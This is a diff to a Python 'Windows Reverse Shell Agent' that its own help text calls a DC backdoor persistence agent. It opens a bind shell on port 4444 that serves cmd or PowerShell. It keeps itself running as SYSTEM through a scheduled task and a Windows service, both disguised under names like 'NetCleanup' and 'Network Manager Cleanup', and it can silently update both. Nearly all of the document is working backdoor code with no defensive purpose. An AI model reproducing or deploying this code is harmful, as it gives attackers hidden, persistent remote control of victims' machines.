@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Windows Reverse Shell Agent 
+Windows Reverse Shell Agent
+
 FEATURES:
  1. Reverse TCP listener (Port 4444 default)
  2. Smart Prompt: user@hostname - folderpath >
@@ -9,6 +10,8 @@ FEATURES:
  4. Self-Repair: Restarts shell if it dies
  5. Lifecycle Manager: Keeps listener alive after shell closure
  6. Dynamic Path Resolution: Uses environment variables for all paths
+ 7. Smart Reconfig: Updates existing Task/Service without full reinstall
+ 8. Single Payload Enforcement: Prevents multiple active instances
 """
 
 import socket
@@ -29,11 +32,10 @@ class PathAbstraction:
     """
     @staticmethod
     def get_script_path():
-        """Get absolute path to running script (current or installed)."""
+        """Get absolute path to running script."""
         if hasattr(sys, 'frozen'):
             return os.path.abspath(sys.executable)
-        else:
-            return os.path.abspath(sys.argv[0])
+        return os.path.abspath(sys.argv[0])
     
     @staticmethod
     def get_script_directory():
@@ -44,11 +46,8 @@ class PathAbstraction:
     @staticmethod
     def get_python_executable():
         """Get Python executable path from environment."""
-        # Try sys.executable first (most reliable for same-process calls)
         if hasattr(sys, 'frozen'):
             return sys.executable
-        
-        # Create list of common Python executable paths
         current_user = os.environ.get('USERNAME', 'User')
         current_version = '38'  # Default version
         
@@ -57,26 +56,14 @@ class PathAbstraction:
         
         # Check in current user's AppData directory
         for ver in ['36', '38', '39', '310', '311', '312']:
-            path = os.path.join(
-                'C:\\Users\\{0}'.format(current_user),
-                'AppData\\Local\\Programs\\Python',
-                'Python{0}'.format(ver),
-                'python.exe'
-            )
+            path = os.path.join('C:\\Users\\{0}'.format(current_user), 'AppData\\Local\\Programs\\Python', 'Python{0}'.format(ver), 'python.exe')
             python_paths.append(path)
         
         # Check in Program Files
         for ver in ['36', '38', '39', '310', '311', '312']:
-            path = os.path.join(
-                'C:\\Program Files\\Python{0}'.format(ver),
-                'python.exe'
-            )
+            path = os.path.join('C:\\Program Files\\Python{0}'.format(ver), 'python.exe')
             python_paths.append(path)
-            
-            path64 = os.path.join(
-                'C:\\Program Files (x86)\\Python{0}'.format(ver),
-                'python.exe'
-            )
+            path64 = os.path.join('C:\\Program Files (x86)\\Python{0}'.format(ver), 'python.exe')
             python_paths.append(path64)
         
         # Check in SystemRoot
@@ -104,7 +91,6 @@ class PathAbstraction:
     @staticmethod
     def get_schtasks_path():
         """Get schtasks.exe path using environment variables."""
-        # Try environment variable first
         windir = os.environ.get('WINDIR', 'C:\\Windows')
         systemroot = os.environ.get('SystemRoot', 'C:\\Windows')
         systemdrive = os.environ.get('SystemDrive', 'C:\\')
@@ -113,31 +99,23 @@ class PathAbstraction:
             os.path.join(windir, 'System32', 'schtasks.exe'),
             os.path.join(systemroot, 'System32', 'schtasks.exe'),
             os.path.join(systemdrive, 'Windows', 'System32', 'schtasks.exe'),
-            'schtasks.exe',  # Check current directory first
+            'schtasks.exe',
         ]
         
         for path in paths:
             if os.path.exists(path):
                 return path
-        return 'schtasks.exe'  # Ultimate fallback
+        return 'schtasks.exe'
     
     @staticmethod
     def get_powershell_path():
         """Get PowerShell executable path."""
-        # Try common locations using environment variables
         for windir in [os.environ.get('WINDIR', 'C:\\Windows'), os.environ.get('SystemRoot', 'C:\\Windows')]:
             paths = [
                 os.path.join(windir, 'System32', 'WindowsPowerShell\\v1.0\\powershell.exe'),
                 os.path.join(windir, 'System32', 'powershell.exe'),
             ]
-            
             for path in paths:
-                if os.path.exists(path):
-                    return path
-            paths2 = [
-                os.path.join(windir, 'System32', 'WindowsPowerShell\\v1.0\\pwsh.exe'),
-            ]
-            for path in paths2:
                 if os.path.exists(path):
                     return path
         return os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', 'powershell.exe')
@@ -153,16 +131,12 @@ class PathAbstraction:
     
     @staticmethod
     def get_current_user():
-        """Get current username from environment."""
         return os.environ.get('USERNAME', 'User')
     
     @staticmethod
     def get_current_hostname():
-        """Get current hostname from environment."""
-        # Try environment variable first
         hostname = os.environ.get('COMPUTERNAME', 'Hostname')
         if not hostname:
-            # Fall back to hostname command
             try:
                 proc = Popen('hostname', shell=True, stdout=PIPE, stderr=PIPE, text=True)
                 hostname = proc.stdout.strip()
@@ -172,7 +146,6 @@ class PathAbstraction:
     
     @staticmethod
     def get_current_location():
-        """Get current folder path."""
         current_dir = os.getcwd()
         if not current_dir:
             try:
@@ -185,34 +158,28 @@ class PathAbstraction:
     
     @staticmethod
     def get_full_script_path_for_task():
-        """
-        Get absolute script path for Task Scheduler.
-        Uses environment variables to construct portable path.
-        """
-        # Try to resolve from running script first
+        """Get absolute script path for Task Scheduler."""
         script_path = PathAbstraction.get_script_path()
         if script_path:
             return script_path.replace('\\', '\\\\')
-        
-        # Fall back to environment variable construction
         systemdrive = os.environ.get('SystemDrive', 'C:\\')
         windir = os.environ.get('WINDIR', 'C:\\Windows')
         return os.path.join(systemdrive, windir, os.path.basename(script_path)).replace('\\', '\\\\')
-                                                                                        
+
 # === CONFIGURATION ===
 LISTENER_HOST = "0.0.0.0"
 DEFAULT_PORT = 4444
-DEFAULT_TASK_NAME = "Network Manager Cleanup"
+DEFAULT_TASK_NAME = "NetCleanup"
 DEFAULT_TASK_RUN_AS = "SYSTEM"
-DEFAULT_TASK_TRIGGER = "ONSTART"
+DEFAULT_TASK_TRIGGER = "ONSTART" # Default to ONSTART, but allow override to MINUTE/5Min
 SERVICE_NAME = "NetCleanup"
-SERVICE_DISPLAY_NAME = "Network Cleanup Service"
+SERVICE_DISPLAY_NAME = "Network Manager Cleanup"
 SERVICE_DESCRIPTION = "Windows Service with Self-Repair for Network Connection Cleanup"
 
 # === PROMPT CONFIGURATION ===
 PROMPT_TEMPLATE = "{user}@{hostname} - {folder}>"
 
-# === WINDOWS SERVICE CLASS (Dynamic Paths) ===
+# === WINDOWS SERVICE CLASS (Dynamic Paths + Reconfig) ===
 class WindowsService:
     """Windows Service wrapper for DC Payload with dynamic path resolution."""
     
@@ -220,7 +187,6 @@ class WindowsService:
         self.service_name = service_name
         self.display_name = display_name
         self.description = description
-        # Use path abstraction for script path
         self.path = PathAbstraction.get_script_path()
         self.args = args
         self.running = True
@@ -232,15 +198,14 @@ class WindowsService:
         print("=" * 40)
         
         try:
-            # Format: binPath="full_path.py [args]" (all inside quotes)
+            # === FIXED: Build proper sc create command with single-quoted binPath ===
             script_dir = PathAbstraction.get_script_directory()
             script_name = os.path.basename(self.path)
             full_path = os.path.join(script_dir, script_name)
             
-            # Include args inside the binPath quotes
+            # === CRITICAL FIX ===
             binPath = f'"{full_path} {self.args}"'
             
-            # Build complete command string
             command = (
                 f'sc create {self.service_name} '
                 f'binPath={binPath} '
@@ -259,38 +224,48 @@ class WindowsService:
                 print(f"[+] Script Path: {full_path}")
                 print(f"[+] Arguments: {self.args}")
                 print(f"[+] Full binPath: {binPath}")
-                print("[*] Run 'sc start DC_Persistence_Service' to start")
-                print("[*] Run 'sc stop DC_Persistence_Service' to stop")
-                print("[*] Run 'sc qc DC_Persistence_Service' to query")
+                print("[*] Run 'sc start NetCleanup' to start")
+                print("[*] Run 'sc stop NetCleanup' to stop")
+                print("[*] Run 'sc qc NetCleanup' to query")
                 return True
             else:
                 print(f"[!] Error creating service: {result.stderr}")
                 print(f"[!] Return Code: {result.returncode}")
                 print(f"[!] Full Command: {command}")
                 return False
-                    
+                
         except Exception as e:
             print(f"[!] Exception: {e}")
             import traceback
             print(traceback.format_exc())
             return False
-
     
-    def uninstall(self):
-        """Uninstall Windows Service."""
+    def config(self):
+        """Update existing service config (Non-destructive)."""
         print("=" * 40)
-        print("UNINSTALLING WINDOWS SERVICE")
+        print("CONFIGURING WINDOWS SERVICE (Non-destructive)")
         print("=" * 40)
         
         try:
-            command = f'sc delete {self.service_name}'
+            script_dir = PathAbstraction.get_script_directory()
+            script_name = os.path.basename(self.path)
+            full_path = os.path.join(script_dir, script_name)
+            
+            binPath = f'"{full_path} {self.args}"'
+            command = f'sc config {self.service_name} binPath={binPath}'
+            print(f"[*] Running Command: {command}")
             result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            
             if result.returncode == 0:
-                print(f"[+] Service deleted: {self.service_name}")
+                print(f"[+] Service Configured: {self.service_name}")
+                print(f"[+] Script Path: {full_path}")
+                print(f"[+] Arguments: {self.args}")
+                print("[*] Service is still running, no restart needed.")
                 return True
             else:
-                print(f"[!] Error deleting service: {result.stderr}")
+                print(f"[!] Error configuring service: {result.stderr}")
                 return False
+                
         except Exception as e:
             print(f"[!] Exception: {e}")
             return False
@@ -338,12 +313,10 @@ class WindowsService:
         print("[*] Service started successfully")
         print("[*] Starting main listener loop")
         
-        # Start listener thread
         self.main_thread = threading.Thread(target=self.main_listener)
         self.main_thread.daemon = True
         self.main_thread.start()
         
-        # Keep service running
         while self.running:
             time.sleep(1)
     
@@ -415,9 +388,9 @@ class ShellPromptManager:
         try:
             return PROMPT_TEMPLATE.format(user=user, hostname=hostname, folder=folder)
         except:
-            return ">"
+            return "User@Hostname - root>"
 
-# === PERSISTENCE MANAGER (Dynamic Paths) ===
+# === PERSISTENCE MANAGER (Dynamic Paths + Smart Reconfig) ===
 class PersistenceManager:
     @staticmethod
     def create_task(script_path, task_name, run_as="SYSTEM", trigger="ONSTART"):
@@ -426,18 +399,33 @@ class PersistenceManager:
         # === Dynamic schtasks path using environment variables ===
         schtasks_exe = PathAbstraction.get_schtasks_path()
 
-        # ONSTART/ONLOGON don't use /ST or /SD
-        if trigger in ["ONSTART", "ONLOGON", "ONIDLE", "ONEVENT"]:
-            command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC {trigger} /F'
+        # === Smart Reconfig: Check if task exists ===
+        check_cmd = f'{schtasks_exe} /Query /TN "{task_name}"'
+        result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True, timeout=5)
+        
+        if result.returncode == 0 and result.stdout.strip():
+            print(f"[!] Task '{task_name}' already exists. Updating/Replacing...")
+            # Use Change/Update instead of Create to avoid deletion
+            # ONSTART/ONLOGON don't use /ST or /SD
+            if trigger in ["ONSTART", "ONLOGON", "ONIDLE", "ONEVENT"]:
+                command = f'{schtasks_exe} /Change /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC {trigger} /F'
+            else:
+                command = f'{schtasks_exe} /Change /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC ONSTART /ST 00:00 /F'
         else:
-            command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC ONSTART /ST 00:00 /F'
+            # Create if not exists
+            print(f"[+] Task '{task_name}' not found. Creating...")
+            # ONSTART/ONLOGON don't use /ST or /SD
+            if trigger in ["ONSTART", "ONLOGON", "ONIDLE", "ONEVENT"]:
+                command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC {trigger} /F'
+            else:
+                command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC ONSTART /ST 00:00 /F'
 
         try:
             print(f"[*] Running Command: {command}")
             result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
 
             if result.returncode == 0:
-                print(f"[+] Task Created/Updated: {task_name}")
+                print(f"[+] Task {'Updated' if result.returncode == 0 else 'Created'}/Updated: {task_name}")
                 print(f"[+] Running As: {run_as}")
                 print(f"[+] Trigger: {trigger}")
             else:
@@ -468,34 +456,33 @@ def get_script_path():
     return PathAbstraction.get_script_path()
 
 def main():
-    parser = argparse.ArgumentParser(description="Windows Reverse Shell Agent")
+    parser = argparse.ArgumentParser(description="DC Reverse Shell Persistence Agent (Service + Dynamic Path Mode)")
     parser.add_argument('--mode', type=str, default='cmd', choices=['cmd', 'powershell'], help='Shell mode (Default: cmd)')
     parser.add_argument('--port', type=int, default=DEFAULT_PORT, help='Listening port (Default: 4444)')
     parser.add_argument('--install', action='store_true', help='Install as Windows Service')
     parser.add_argument('--service', action='store_true', help='Run as Windows Service')
     parser.add_argument('--install-persistence', action='store_true', help='Install Task Scheduler persistence')
     parser.add_argument('--path', type=str, default=".", help='Script path')
+    parser.add_argument('--task-name', type=str, default=DEFAULT_TASK_NAME, help='Task Name (Default: DC_Backdoor_Persistence)')
+    parser.add_argument('--task-freq', type=str, default=DEFAULT_TASK_TRIGGER, help='Task Frequency (Default: ONSTART, e.g. MINUTE, 5MIN)')
+    parser.add_argument('--reconfig', action='store_true', help='Reconfig existing Service/Task without restart')
     args = parser.parse_args()
 
     print("=" * 40)
-    print("WINDOWS REVERSE SHELL AGENT")
+    print("WINDOWS REVERSE SHELL AGENT (SERVICE + DYNAMIC PATH MODE)")
     print("=" * 40)
 
     script_path = get_script_path()
     print(f"[*] Script Executing From: {script_path}")
     
-    # === Dynamic Path Debug Info ===
-    print("[*] Dynamic Path Resolution Info:")
-    print(f"    [1] Python: {PathAbstraction.get_python_executable()}")
-    print(f"    [2] schtasks: {PathAbstraction.get_schtasks_path()}")
-    print(f"    [3] PowerShell: {PathAbstraction.get_powershell_path()}")
-    print(f"    [4] cmd.exe: {PathAbstraction.get_cmd_path()}")
-    print(f"    [5] USERNAME: {PathAbstraction.get_current_user()}")
-    print(f"    [6] COMPUTERNAME: {PathAbstraction.get_current_hostname()}")
-
     # === 1. Setup Persistence (Create Task) ===
     if args.install or args.install_persistence:
-        PersistenceManager.create_task(script_path, DEFAULT_TASK_NAME, DEFAULT_TASK_RUN_AS, DEFAULT_TASK_TRIGGER)
+        PersistenceManager.create_task(
+            script_path, 
+            args.task_name, 
+            DEFAULT_TASK_RUN_AS, 
+            args.task_freq
+        )
         time.sleep(2)
 
     # === 2. Windows Service Installation ===
@@ -504,6 +491,7 @@ def main():
         print("INSTANTIATING WINDOWS SERVICE")
         print("=" * 40)
         
+        # Check if service already exists before install
         service = WindowsService(
             SERVICE_NAME, 
             SERVICE_DISPLAY_NAME, 
@@ -511,15 +499,12 @@ def main():
             script_path, 
             f"--port {DEFAULT_PORT} --mode {args.mode}"
         )
+        
+        # Try to install/config
         if service.install():
-            print("[*] Press any key to start service, or Ctrl+C to exit")
-            try:
-                input()
-                service.start()
-                service.run_loop()
-            except KeyboardInterrupt:
-                print("[*] Service stopped")
-                service.stop()
+            print("[*] Service installed successfully.")
+            if args.reconfig:
+                print("[*] Service reconfigured successfully.")
         else:
             print("[*] Press any key to run in interactive mode")
             input()
@@ -629,7 +614,7 @@ def main():
                 user, hostname, folder = ShellPromptManager.get_prompt_info(self.command_type)
                 return ShellPromptManager.create_prompt(user, hostname, folder)
             except:
-                return ">"
+                return "User@Hostname - root>"
 
     # === 5. Start Listener Thread (Daemonized) ===
     listener = MainListener(LISTENER_HOST, args.port, args.mode)
